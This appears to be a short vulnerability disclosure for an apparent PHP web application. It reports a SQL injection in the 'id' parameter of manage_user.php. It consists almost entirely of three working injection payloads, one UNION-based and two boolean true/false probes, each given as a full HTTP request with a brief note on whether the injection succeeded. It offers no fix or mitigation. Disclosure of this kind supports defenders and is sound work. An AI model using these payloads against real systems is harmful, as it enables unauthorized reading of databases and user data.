BUG_Author:yuan

Vulnerability File: /aqpg/users/user/manage_user.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=-1' union all select null,null,null,concat(0x35363738,0x41424344),null,null,null,null,null,null-- -

```
GET /aqpg/users/user/manage_user.php?id=-1%27%20union%20all%20select%20null,null,null,concat(0x35363738,0x41424344),null,null,null,null,null,null--%20- HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=c1ar1p7pfa6fn4k57t6vf5f0ag
Connection: close
```

union query success

![image](https://github.com/gxu-yuan/bug_report/blob/main/sql1.png)

Payload2:id=1' and 'a'='a

```
GET /aqpg/users/user/manage_user.php?id=1%27%20and%20%27a%27=%27a HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=c1ar1p7pfa6fn4k57t6vf5f0ag
Connection: close
```

The page is echoed normally

![image](https://github.com/gxu-yuan/bug_report/blob/main/sql2.png)

Payload3:id=1' and 'a'='b

```
GET /aqpg/users/user/manage_user.php?id=1%27%20and%20%27a%27=%27b HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=c1ar1p7pfa6fn4k57t6vf5f0ag
Connection: close
```

page echo error

![image](https://github.com/gxu-yuan/bug_report/blob/main/sql3.png)
